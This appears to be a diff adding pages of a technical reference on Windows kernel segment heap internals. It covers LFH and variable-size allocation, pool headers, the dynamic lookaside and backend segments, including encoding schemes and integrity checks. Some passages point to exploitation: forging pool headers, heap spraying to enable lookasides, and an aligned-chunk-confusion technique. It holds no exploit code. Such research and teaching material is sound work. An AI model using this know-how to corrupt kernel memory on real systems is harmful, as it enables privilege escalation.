+<p><code>_HEAP_LFH_SUBSEGMENT</code> contains the block metadata for a group of same-sized LFH blocks. When there is not enough memory, LFH first takes a subsegment from <code>Buckets-&gt;State.AvailableSubsegmentList</code> and if none is available it allocates a new subsegment from the backend allocator.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ListEntry</code></td><td><code>_LIST_ENTRY</code> (Flink/Blink). Points to the next / previous full or available LFH subsegment.</td></tr>
+<tr><td><code>Owner</code></td><td>Points to the structure that manages the subsegment, back to the <code>AffinitySlots-&gt;State</code> of the bucket it belongs to.</td></tr>
+<tr><td><code>FreeCount</code></td><td>Number of freed blocks currently free in the subsegment (incremented on each free; used with <code>BlockCount</code> to detect an empty subsegment).</td></tr>
+<tr><td><code>BlockCount</code></td><td>Total number of blocks in this subsegment.</td></tr>
+<tr><td><code>FreeHint</code></td><td>Index of the last allocated block; updated when a higher-index block is freed</td></tr>
+<tr><td><code>Location</code></td><td>Indicates the subsegment’s current list/state (e.g., AvailableSubsegmentList(0) or FullSubsegmentList(1)).</td></tr>
+<tr><td><code>BlockOffsets</code></td><td><code>HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS</code>. Indicates the block size of the subsegment and the offset of the first block. The value is encoded (see below).</td></tr>
+<tr><td><code>BlockBitmap</code></td><td>Inline array of 64-bit words (not a pointer). Each word covers 32 blocks, 2 bits per block: bit 0 = <code>is_busy</code>, bit 1 = unused bytes.</td></tr>
+<tr><td><code>Block</code></td><td>The allocated memory returned to the user.</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="encoded-offsets"><a class="header" href="#encoded-offsets">Encoded Offsets</a></h3>
+<p><code>HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS</code> stores the block size and the offset of the first block in the subsegment:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>BlockSize</code></td><td>The size of a block in the subsegment (the original size).</td></tr>
+<tr><td><code>FirstBlockOffset</code></td><td>The offset of the first block. <code>FirstBlock = Subsegment + FirstBlockOffset</code>.</td></tr>
+</tbody>
+</table>
+</div>
+<p>Encoding:</p>
+<div class="admonition warn">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>EncodedData</strong> = <code>RtlpHpHeapGlobals.LfhKey ^ BlockOffsets ^ (Subsegment &gt;&gt; 12)</code></p>
+
+</div>
+
+<h2 id="activation-mechanism"><a class="header" href="#activation-mechanism">Activation Mechanism</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/lfh_activation.svg" alt="LFH activation flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/lfh_activation.svg" alt="LFH activation flow">
+</span>
+<p>When allocating a block smaller than <code>LfhContext-&gt;Config.MaxBlockSize</code>, the allocator first checks whether LFH is enabled for the corresponding bucket:</p>
+<ol>
+<li>Compute the bucket index: <code>idx = RtlpLfhBucketIndexMap[needbytes + 0xf]</code>.</li>
+<li>Check <code>Buckets[idx]-&gt;State &amp; 1</code>. If set, the allocation is handled by LFH.</li>
+<li>If LFH is not enabled, update the bucket’s usage statistics via <code>RtlpHpLfhBucketUpdateStats</code>. Each allocation adds <code>0x210000</code> to <code>buckets[idx]</code>.</li>
+<li>LFH is activated via <code>RtlpHpLfhBucketActivate</code> when either threshold is crossed:
+<ul>
+<li><code>(buckets[idx] &gt;&gt; 16) &amp; 0x1f &gt; 0x10</code> : the <strong>active-allocation counter</strong> exceeds <code>0x10</code> (16).</li>
+<li><code>(buckets[idx] &gt;&gt; 16) &gt; 0xff00</code> : the <strong>total-request counter</strong> exceeds <code>0xff00</code> (65,280).
+Since each allocation adds <code>0x210000</code>, the upper 16 bits increase by <code>0x21</code> (33) per allocation. Thus, <code>0xff00 / 0x21 ≈ 1,978</code>, giving the <strong>~2,000-allocation threshold</strong>.</li>
+</ul>
+</li>
+</ol>
+<p>When LFH is activated, the required bucket structures (bucket, owner, affinity slot, etc.) are allocated with <code>RtlpHpHeapExtendContext</code>, directly from <code>_SEGMENT_HEAP-&gt;AllocatedBase</code> (which usually points to the end of the segment heap structure), then initialized by <code>RtlpHpLfhBucketInitialize</code>. Once enabled, LFH is used for every allocation of that size.</p>
+<h2 id="allocation-mechanism"><a class="header" href="#allocation-mechanism">Allocation Mechanism</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/lfh_allocation.svg" alt="LFH allocation flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/lfh_allocation.svg" alt="LFH allocation flow">
+</span>
+<p>LFH allocation first finds or creates the relevant bucket for the requested size (see Activation). If LFH is enabled for the size, allocation continues in <code>nt!RtlpHpLfhSlotAllocate</code>:</p>
+<ol>
+<li>Select an affinity slot (using the requesting thread’s processor and <code>LfhContext-&gt;ProcAffinityMapping</code>).</li>
+<li>Get the <code>ActiveSubsegment</code> from the selected affinity slot.</li>
+<li>If the lowest 12 bits of <code>ActiveSubsegment</code> (available blocks) is greater than 0, allocate a block from the active subsegment. Otherwise, take a subsegment from <code>AvailableSubsegmentList</code>, or if none is available allocate and initialize a new subsegment with <code>RtlpHpLfhSubsegmentCreate</code> and add it to <code>AffinitySlot-&gt;State.AvailableSubsegmentList</code>.</li>
+</ol>
+<h3 id="allocating-a-block-from-the-active-subsegment"><a class="header" href="#allocating-a-block-from-the-active-subsegment">Allocating a Block from the Active Subsegment</a></h3>
+<span class="theme-diagram diagram-lg" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/lfh_activesubsegment.svg" alt="LFH active subsegment allocation">
+  <img class="diagram-dark" src="assets/diagrams/dark/lfh_activesubsegment.svg" alt="LFH active subsegment allocation">
+</span>
+<p>Which block is selected is randomized, similar to LFH in the NT heap:</p>
+<ol>
+<li><strong>Get a random value:</strong> Read <code>RtlpLowFragHeapRandomData[x]</code>, a 256-byte table containing values from <code>0x00</code>–<code>0x7f</code>.</li>
+<li><strong>Locate the bitmap entry:</strong> Use <code>FreeHint</code> to select the relevant <code>BlockBitmap</code> entry: <code>Index = (2 * FreeHint) &gt;&gt; 6</code>; then <code>Bitmap = BlockBitmap[Index]</code>.</li>
+<li><strong>Find a reference point:</strong> Locate the first <strong>allocated/busy block</strong> (<code>FirstNotFreeIdx</code>) in the bitmap. This is used as the starting point for randomized selection.</li>
+<li><strong>Calculate the candidate block:</strong>
+<ul>
+<li><code>SearchWidth = RtlpSearchWidth[BucketIndex]</code></li>
+<li><code>randval = RtlpLowFragHeapRandomData[x]</code></li>
+<li><code>val = (SearchWidth * randval &gt;&gt; 7) &amp; 0x1FFFFFE</code></li>
+<li><code>blockIndex = (FirstNotFreeIdx + val) &amp; 0x3f</code></li>
+</ul>
+</li>
+<li><strong>Find a free block:</strong> Check the candidate’s busy bit. If it is busy, search for the nearest free block; if free, mark it as allocated in <code>BlockBitmap</code>.</li>
+<li><strong>Record unused space:</strong> If the allocation does not consume the entire block, store the unused-byte count at the end of the block.</li>
+<li><strong>Update metadata:</strong> Set <code>FreeHint = blockIndex</code>, decrement the available-block count (low 12 bits of <code>ActiveSubsegment</code>), and return the block.</li>
+</ol>
+<h2 id="free-mechanism"><a class="header" href="#free-mechanism">Free Mechanism</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/lfh_free.svg" alt="LFH free flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/lfh_free.svg" alt="LFH free flow">
+</span>
+<p>Freeing an LFH block is handled by <code>nt!RtlpHpLfhSubsegmentFreeBlock</code>:</p>
+<ol>
+<li>Decode <code>Subsegment-&gt;BlockOffsets</code> to recover the block size and the offset of the first block.</li>
+<li>Compute the block index: <code>idx = (block - subsegmentBase - FirstBlockOffset) / BlockSize</code>.</li>
+<li>Clear the corresponding <code>BlockBitmap</code> bit and increment <code>Subsegment-&gt;FreeCount</code>.</li>
+<li>If <code>FreeCount == BlockCount - 1</code>, all blocks of the subsegment are free: remove the subsegment from <code>AvailableSubsegmentList</code> (with a double-linked-list check) and release the subsegment back to the backend allocator.</li>
+<li>Otherwise the subsegment stays in use and free is done.</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="variable-size-allocation"><a class="header" href="#variable-size-allocation">Variable Size Allocation</a></h1>
+<p class="reading-meta">1378 words · 6 minutes</p>
+
+<p>VS is the frontend allocator for variable-sized chunks. It is used for allocations that are too large or unsuitable for LFH but still below the backend/large-block threshold.</p>
+<h2 id="allocation-size-1"><a class="header" href="#allocation-size-1">Allocation Size</a></h2>
+<p>VS is used when:</p>
+<ul>
+<li><code>Size &lt;= 0x200</code> and LFH is not enabled for that size</li>
+<li><code>0x200 &lt; Size &lt;= 0xfe0</code></li>
+<li><code>0xfe0 &lt; Size &lt;= 0x20000</code> and <code>(Size &amp; 0xfff) != 0</code> (ie. size not page aligned)</li>
+</ul>
+<h2 id="vs-chunks"><a class="header" href="#vs-chunks">VS Chunks</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/vs_chunks.svg" alt="VS chunks">
+  <img class="diagram-dark" src="assets/diagrams/dark/vs_chunks.svg" alt="VS chunks">
+</span>
+<p>A chunk is the basic unit of the VS allocator. In front of every chunk there is metadata that records chunk information (<code>_HEAP_VS_CHUNK_HEADER</code> for in-use chunks, <code>_HEAP_VS_CHUNK_FREE_HEADER</code> for freed chunks). This is similar to the backend allocator in the NT heap.</p>
+<h3 id="in-use-chunk-header"><a class="header" href="#in-use-chunk-header">In-use chunk header</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>MemoryCost</code></td><td>Only used when freed (see free header).</td></tr>
+<tr><td><code>UnsafeSize</code></td><td>The size of the chunk.</td></tr>
+<tr><td><code>UnsafePrevSize</code></td><td>The size of the previous chunk.</td></tr>
+<tr><td><code>Allocated</code></td><td>Indicates whether the chunk is allocated (value is 1 if allocated).</td></tr>
+<tr><td><code>EncodedSegmentPageOffset</code></td><td>Index of the page of the chunk inside the VS subsegment. Used to find the VS subsegment on free. It is also encoded (see below).</td></tr>
+<tr><td><code>UnusedBytes</code></td><td>Indicates whether the allocated chunk has unused memory.</td></tr>
+</tbody>
+</table>
+</div>
+<p>The chunk header is encoded:</p>
+<div class="admonition warn">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>Encoded header</strong> = <code>Chunk Header ^ Chunk Address ^ RtlpHpHeapGlobals.HeapKey</code></p>
+
+<p><strong>EncodedSegmentPageOffset</strong> = <code>Chunk Address ^ SegmentPageOffset ^ RtlpHpHeapGlobals.HeapKey</code></p>
+
+</div>
+
+<h3 id="freed-chunk-header"><a class="header" href="#freed-chunk-header">Freed chunk header</a></h3>
+<p>The 8-byte header is the same as the allocated chunk. Differences:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>MemoryCost</code></td><td>Indicates how many pages of memory need to be committed when the chunk is allocated.</td></tr>
+<tr><td><code>Node</code></td><td><code>_RTL_BALANCED_NODE</code>: <code>Left</code> (8 bytes), <code>Right</code> (8 bytes), <code>ParentValue</code> (8 bytes). The node of the red-black tree; freed chunks are stored in the <code>FreeChunkTree</code>.</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="vs-context"><a class="header" href="#vs-context">VS Context</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/vs_context_structure.svg" alt="VS context structure">
+  <img class="diagram-dark" src="assets/diagrams/dark/vs_context_structure.svg" alt="VS context structure">
+</span>
+<p><code>_HEAP_VS_CONTEXT</code> is the main VS allocator state. It manages free chunks, delay-free state, subsegments, and configuration used by the variable-size path.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>FreeChunkTree</code></td><td><code>_RTL_RB_TREE</code>. Red-black tree of free chunks, ordered by size (see <a href="#freechunktree">FreeChunkTree</a>).</td></tr>
+<tr><td><code>SubsegmentList</code></td><td>Linked list of VS subsegments.</td></tr>
+<tr><td><code>DelayFreeContext</code></td><td><code>_HEAP_VS_DELAY_FREE_CONTEXT</code>. State for delayed frees. (see <a href="#delayfreecontext">DelayFreeContext</a>)</td></tr>
+<tr><td><code>BackendCtx</code></td><td>Points to the backend allocator (<code>_HEAP_SEG_CONTEXT</code>) used by the VS allocator.</td></tr>
+<tr><td><code>Callbacks</code></td><td><code>_HEAP_SUBALLOCATOR_CALLBACKS</code>. Callback function table used to allocate / free subsegments (<code>Allocate</code>, <code>Free</code>, <code>Commit</code>, <code>Decommit</code>, <code>ExtendContext</code>). The function pointers are encoded (see below).</td></tr>
+<tr><td><code>Config</code></td><td><code>_RTL_HP_VS_CONFIG</code>. Attributes of the VS allocator.</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition warn">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>EncodedCallback</strong> = <code>FunctionPointer ^ VsContext ^ RtlpHpHeapGlobals.HeapKey</code></p>
+
+</div>
+
+<h3 id="vs-config"><a class="header" href="#vs-config">VS Config</a></h3>
+<pre><code class="language-text">_RTL_HP_VS_CONFIG
+PageAlignLargeAllocs   default 1 in kernel, 0 in usermode
+FullDecommit
+EnableDelayFree        default 1 in kernel, 0 in usermode
+</code></pre>
+<h3 id="freechunktree"><a class="header" href="#freechunktree">FreeChunkTree</a></h3>
+<p>After a chunk is freed, it is placed into the <code>FreeChunkTree</code> of the heap, inserted according to size. If the chunk is larger than the node it goes into the right subtree, otherwise into the left subtree. If there is no chunk larger than a node, its right subtree is NULL (and similarly for the left).</p>
+<pre><code class="language-text">_RTL_RB_TREE
+0x0    Root
+0x8    Encoded
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Root</code></td><td>Points to the root of the red-black tree.</td></tr>
+<tr><td><code>Encoded</code></td><td>Indicates whether the root has been encoded (default disabled).</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>EncodedRoot</strong> = <code>Root ^ FreeChunkTree</code></p>
+
+</div>
+
+<p>There is a node check when a node is taken out of the tree.</p>
+<h3 id="delayfreecontext"><a class="header" href="#delayfreecontext">DelayFreeContext</a></h3>
+<p>When delay free is enabled (default enabled in the kernel, disabled in usermode) and the chunk size is <code>&lt; 0x1000</code>, freeing a chunk does not free it immediately. The chunk is added to a singly linked list (<code>DelayFreeContext</code>); once the number of chunks in the list exceeds <code>0x20</code>, all chunks in the list are freed at once. The next pointer is stored at the beginning of the user data, and the list is FILO. To check whether delay free is enabled, inspect <code>VsContext-&gt;Config</code>.</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Depth</code></td><td>The number of chunks in the linked list.</td></tr>
+<tr><td><code>Sequence</code></td><td>Monotonic sequence number.</td></tr>
+<tr><td><code>NextEntry</code></td><td>Points to the next chunk. At this time the chunk is <strong>still marked Allocated</strong>.</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="vs-subsegment"><a class="header" href="#vs-subsegment">VS Subsegment</a></h2>
+<p><code>_HEAP_VS_SUBSEGMENT</code> is the memory pool of VS allocation. When there is not enough memory, a new subsegment is allocated from the backend allocator. Each subsegment is linked into a linked list (<code>VsContext-&gt;SubsegmentList</code>).</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ListEntry</code></td><td><code>_LIST_ENTRY</code> (Flink/Blink). Points to the next / previous subsegment. The value is encoded (see below). There is also a double-linked-list check.</td></tr>
+<tr><td><code>CommitBitmap</code></td><td>Indicates the commit status of pages in the subsegment; pages are counted from the beginning of the subsegment.</td></tr>
+<tr><td><code>CommitLock</code></td><td>Lock used when committing pages.</td></tr>
+<tr><td><code>Size</code></td><td>Size of the VS subsegment, right-shifted by 4 bits.</td></tr>
+<tr><td><code>Signature</code></td><td>15-bit signature used for verification when freeing, to make sure the correct subsegment is found.</td></tr>
+<tr><td><code>FullCommit</code></td><td>Whether the whole subsegment is committed.</td></tr>
+</tbody>
+</table>
+</div>
+<div class="admonition warn">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>EncodedFlink/Blink</strong> = <code>Flink/Blink ^ &amp;ListEntry ^ &amp;(next/prev subsegment)</code></p>
+
+</div>
+
+<p>Behind the VS subsegment header is the memory pool of the VS allocator. At the beginning the whole pool is a single large chunk; it is split when allocated and coalesced with neighbors when freed.</p>
+<div class="admonition danger">
+<p class="admonition-title">Verification on Free</p>
+
+<p><code>Subsegment-&gt;Size ^ Subsegment-&gt;Signature ^ 0x2BED == 0</code>, <strong>BSOD</strong> if verification fails</p>
+
+</div>
+
+<h2 id="allocation-mechanism-1"><a class="header" href="#allocation-mechanism-1">Allocation Mechanism</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/vs_allocation.svg" alt="VS allocation flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/vs_allocation.svg" alt="VS allocation flow">
+</span>
+<p>The main implementation function is <code>nt!RtlpHpVsContextAllocateInternal</code>:</p>
+<ol>
+<li>Calculate the required chunk size.</li>
+<li>Find a suitable chunk in <code>VsContext-&gt;FreeChunkTree</code>. Start at the root: if the required chunk is larger than the node, continue searching in the right subtree until found or NULL.</li>
+<li>If no suitable chunk is found, allocate a subsegment (<code>RtlpHpVsSubsegmentCreate</code>, which requests memory from the backend with <code>RtlpHpSegVsAllocate</code>, minimum size <code>0x10000</code>), add it to the VS context (<code>RtlpHpVsContextAddSubsegment</code>), and search <code>FreeChunkTree</code> again.
+<ul>
+<li>If <code>PageAlignLargeAllocs</code> is set, the subsegment is split into two chunks: one directly behind the subsegment structure and one whose user data is page-aligned; both are added to <code>FreeChunkTree</code>.</li>
+<li>Otherwise, the entire subsegment is treated as one large chunk added to <code>FreeChunkTree</code>.</li>
+</ul>
+</li>
+<li>When a chunk is found and its size is larger than requested, split it (<code>RtlpHpVsChunkSplit</code>): remove the chunk from <code>FreeChunkTree</code>, split it, and re-add the remainder as a new free chunk. If the remainder exceeds one page, split it into two pieces according to the page.</li>
+<li>If <code>request size &lt; chunk size</code>, store the unused-byte count in the chunk’s last 2 bytes so the allocator can recover the chunk’s actual size when it is freed.</li>
+</ol>
+<h2 id="free-mechanism-1"><a class="header" href="#free-mechanism-1">Free Mechanism</a></h2>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/vs_free.svg" alt="VS free flow">
+  <img class="diagram-dark" src="assets/diagrams/dark/vs_free.svg" alt="VS free flow">
+</span>
+<p>The main implementation function is <code>nt!RtlpHpVsContextFree</code>:</p>
+<ol>
+<li>Verify the subsegment signature and the chunk’s <code>Allocated</code> byte.</li>
+<li>If <code>UnusedBytes</code> is set, read the unused-byte count stored in the chunk’s last 2 bytes to recover the requested user size.</li>
+<li>If <code>DelayFreeContext.Depth &lt; 0x20</code>, put the chunk on the delay-free list and return.</li>
+<li>If the delay-free list is full, process the queued chunks one by one, locating each VS subsegment using <code>EncodedSegmentPageOffset</code> and verifying it again.</li>
+<li>Coalesce the chunk with neighboring free chunks using <code>RtlpHpVsChunkCoalesce</code>; remove the affected chunks from <code>FreeChunkTree</code> and update <code>PrevSize</code>/<code>Size</code>.</li>
+<li>If <code>chunk + 0x20</code> is at the beginning of a page, split the chunk at the page boundary.</li>
+<li>If the merged chunk occupies the entire subsegment, remove and release the subsegment to the backend.</li>
+<li>Otherwise, calculate and encode <code>MemoryCost</code> and <code>SegmentPageOffset</code>, then insert the merged chunk into <code>FreeChunkTree</code>.</li>
+</ol>
+<p>The tree-structure is verified during coalescing/removal:</p>
+<pre><code class="language-text">L-&gt;Parent-&gt;Left == L
+R-&gt;Parent-&gt;Right == R
+P-&gt;Left-&gt;Parent == P
+P-&gt;Right-&gt;Parent == P
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="pool-header"><a class="header" href="#pool-header">Pool Header</a></h1>
+<p class="reading-meta">581 words · 2 minutes</p>
+
+<h2 id="pool-header-1"><a class="header" href="#pool-header-1">Pool Header</a></h2>
+<p>When the allocation size is <code>&lt;= 0xfe0</code>, both LFH and VS allocate an additional <code>0x10</code> (16) bytes to store a <code>_POOL_HEADER</code>. The pool header was mostly used by the pool allocator before 19H1. Today it is basically used in a few cases to get fields like <code>CacheAligned</code>, <code>PoolQuota</code>, and <code>PoolTrack</code>.</p>
+<p>The layout differs between LFH and VS:</p>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/pool_header.svg" alt="Pool header overview">
+  <img class="diagram-dark" src="assets/diagrams/dark/pool_header.svg" alt="Pool header overview">
+</span>
+<h3 id="pool-header-structure"><a class="header" href="#pool-header-structure">Pool Header Structure</a></h3>
+<span class="theme-diagram diagram-sm" width="20%">
+  <img class="diagram-light" src="assets/diagrams/light/pool_header_structure.svg" alt="Pool header structure">
+  <img class="diagram-dark" src="assets/diagrams/dark/pool_header_structure.svg" alt="Pool header structure">
+</span>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>PreviousSize</code></td><td>Used in the <code>CacheAligned</code> case, indicating the offset between the previous pool header and this header.</td></tr>
+<tr><td><code>PoolIndex</code></td><td>Useless in the segment heap.</td></tr>
+<tr><td><code>BlockSize</code></td><td>The size of the block.</td></tr>
+<tr><td><code>PoolType</code></td><td>The pool type of the block.</td></tr>
+<tr><td><code>PoolTag</code></td><td>The tag string filled in when the block is allocated. When using <code>ExAllocatePoolWithTag</code>, you can specify the pool tag.</td></tr>
+<tr><td><code>ProcessBilled</code></td><td>Used for <code>PoolQuota</code> and <code>CacheAligned</code>.</td></tr>
+</tbody>
+</table>
+</div>
+<p>Since 19H1 most fields are unused. The segment heap tracks sizes in its own metadata, so the allocator only sets:</p>
+<pre><code class="language-c">header-&gt;PoolTag       = PoolTag;
+header-&gt;BlockSize     = BlockSize &gt;&gt; 4;
+header-&gt;PreviousSize  = 0;
+header-&gt;PoolType      = ChangedPoolType &amp; 0x6D | 2;
+</code></pre>
+<ul>
+<li><code>PreviousSize</code> / <code>PoolIndex</code>: unused (kept 0). <code>PreviousSize</code> is only written in the <code>CacheAligned</code> case.</li>
+<li><code>BlockSize</code>: only the free path reads it, to pick the Dynamic Lookaside bucket (see <a href="#dynamic-lookaside">Dynamic Lookaside</a>).</li>
+<li><code>ProcessBilled</code>: only with the <code>PoolQuota</code> bit. Quota attacks from the pre-19H1 era (overwriting the pointer to get an arbitrary dereference on free) are mitigated by <code>ExpPoolQuotaCookie</code>, generated at boot:</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">Encoding</p>
+
+<p><strong>ProcessBilled</strong> = <code>KPROCESS ^ ExpPoolQuotaCookie ^ chunk address</code></p>
+
+</div>
+
+<p>On free the kernel decodes and validates the pointer (kernel-mode address, valid process header), so a blind overwrite bugchecks. The upside for attackers: with most fields unused, a forged header needs far less care than before 19H1.</p>
+<h3 id="cachealigned"><a class="header" href="#cachealigned">CacheAligned</a></h3>
+<p>Passing <code>CacheAligned</code> in the pool type aligns the returned pointer to the CPU cache line (64 bytes). To keep a valid header, the chunk can hold two <code>_POOL_HEADER</code>s with padding in between:</p>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/cache_aligned.svg" alt="CacheAligned two-header layout">
+  <img class="diagram-dark" src="assets/diagrams/dark/cache_aligned.svg" alt="CacheAligned two-header layout">
+</span>
+<p>The <code>PreviousSize</code> of the second header points back to <code>HEADER #1</code>, the real chunk header (offset between the two headers). The second header gets: <code>PreviousSize</code> = offset to header #1, <code>BlockSize</code> = reduced size, <code>PoolType</code> with the <code>CacheAligned</code> bit set, and the same <code>PoolTag</code>. The allocator first reserves room for the padding:</p>
+<pre><code class="language-c">if (PoolType &amp; 4) {                            // CacheAligned bit set
+    request_alloc_size += ExpCacheLineSize;    // +64 bytes for padding
+    if (request_alloc_size &gt; 0xFE0) {          // would exceed ~4 KB
+        request_alloc_size -= ExpCacheLineSize; // undo the growth
+        PoolType = PoolType &amp; 0xFB;             // clear CacheAligned -&gt; ignore it
+    }
+}
+</code></pre>
+<p>If the padding would push the request past <code>0xfe0</code> (~4 KB), the flag is cleared and the allocation proceeds normally.</p>
+<p>If the alignment padding leaves room, a pointer (often called <code>AlignedPoolHeader</code>) is stored right after header #1: it points to the second header, XORed with <code>ExpPoolQuotaCookie</code>. Pre-19H1 the free path validated it; the segment-heap free path no longer does (see <a href="#aligned-chunk-confusion-sstic">Aligned Chunk Confusion</a>).</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="dynamic-lookaside"><a class="header" href="#dynamic-lookaside">Dynamic Lookaside</a></h1>
+<p class="reading-meta">362 words · 1 minute</p>
+
+<p>For allocations where <code>0x201 &lt; Size &lt; 0xfe0</code>, the block is not freed immediately. After free it is added to a Dynamic Lookaside list. Depending on the block size (taken from the pool header), it is added to different linked lists. On allocation, the block is taken from the dynamic lookaside first; if not found, the normal allocation path (VS) is entered.</p>
+<span class="theme-diagram diagram-lg">
+  <img class="diagram-light" src="assets/diagrams/light/dynamic_lookaside_list_structure.svg" alt="Dynamic lookaside list structure">
+  <img class="diagram-dark" src="assets/diagrams/dark/dynamic_lookaside_list_structure.svg" alt="Dynamic lookaside list structure">
+</span>
+<p>The dynamic lookaside is stored in <code>_SEGMENT_HEAP-&gt;UserContext</code>, which is a <code>_RTL_DYNAMIC_LOOKASIDE</code>:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>EnabledBucketBitmap</code></td><td>A bitmap indicating which buckets have lookaside enabled.</td></tr>
+<tr><td><code>BucketCount</code></td><td>The total number of buckets in the lookaside.</td></tr>
+<tr><td><code>ActiveBucketCount</code></td><td>The number of buckets with lookaside enabled.</td></tr>
+<tr><td><code>Buckets[64]</code></td><td><code>_RTL_LOOKASIDE</code>. Manages the structures of different lookaside sizes.</td></tr>
+</tbody>
+</table>
+</div>
+<p>Each bucket is a <code>_RTL_LOOKASIDE</code>:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ListHead</code></td><td><code>_SLIST_HEADER</code>. Head of a singly linked list; contains the length of the list and the list itself (common in the Windows kernel).</td></tr>
+<tr><td><code>Depth</code></td><td>The number of chunks that can be stored in the bucket.</td></tr>
+</tbody>
+</table>
+</div>
+<p><code>_SLIST_HEADER</code> fields:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Depth</code></td><td>The number of nodes in the linked list.</td></tr>
+<tr><td><code>NextEntry</code></td><td>Points to the next node. In the dynamic lookaside, it points to the user data of the freed chunk, behind the pool header (which sits after the VS chunk header).</td></tr>
+</tbody>
+</table>
+</div>
+<p>Only a subset of buckets is enabled at a time (<code>ActiveBucketCount</code>). Every third scan, the Balance Set Manager rebalances: the most-used lookasides since the last rebalance are enabled, and each <code>Depth</code> is tuned by the miss ratio (grown by <code>MissRatio * (MaximumDepth - Depth) / 2 + 5</code>, shrunk when allocations are rare). Practically: spray and free a few thousand chunks of a size, wait a couple of seconds, and the matching lookaside is enabled with room in it.</p>
+<p>A chunk sitting in a lookaside bypasses its backend free path entirely: no VS coalescing, no LFH bitmap update. It is a fast-path reuse cache, which is exactly why forged <code>BlockSize</code> values are interesting on free (see <a href="#aligned-chunk-confusion-sstic">Aligned Chunk Confusion</a>).</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="backend-segment-allocation"><a class="header" href="#backend-segment-allocation">Backend Segment Allocation</a></h1>
+<p class="reading-meta">1728 words · 8 minutes</p>
+
+<p>Backend segment allocation manages page-backed memory ranges. Frontend allocators request memory from this layer when they need more backing storage.</p>
+<h2 id="size"><a class="header" href="#size">Size</a></h2>
+<p>In the kernel, segment allocation applies when:</p>
+<ul>
+<li><code>Size</code> is a multiple of a page and <code>Size &lt;= 0x7f0000</code></li>
+<li><code>Size</code> is not a multiple of a page and <code>0x20000 &lt; Size &lt;= 0x7f0000</code></li>
+</ul>
+<p>It is a bit different in userland. There are two categories, differing by block unit:</p>
+<pre><code class="language-text">0x20000 &lt; Size &lt;= 0x7f000
+  unit: 0x1000   (1 page)
+
+0x7f000 &lt; Size &lt;= 0x7f0000
+  unit: 0x10000  (16 pages)
+</code></pre>
+<p>Both units are called “page” here. A block (chunk) consists of single or multiple pages. For example, allocating <code>0x1450</code> bytes allocates 2 pages of <code>0x1000</code>, and <code>0x1337</code> allocates <code>0x2000</code> (2 page units), with the extra <code>0x2000 - 0x1337</code> recorded in the unused bytes.</p>
+<h2 id="page-segments-and-ranges"><a class="header" href="#page-segments-and-ranges">Page Segments and Ranges</a></h2>
+<h3 id="page-segment"><a class="header" href="#page-segment">Page Segment</a></h3>
+<p><code>_HEAP_PAGE_SEGMENT</code> is the memory pool of segment allocation. When no page segment is available, a new one is allocated from the system (<code>MmAllocatePoolMemory</code>), but only the required structure is allocated at the beginning (the block part is not allocated until needed). Each page segment is inserted into a double linked list.</p>
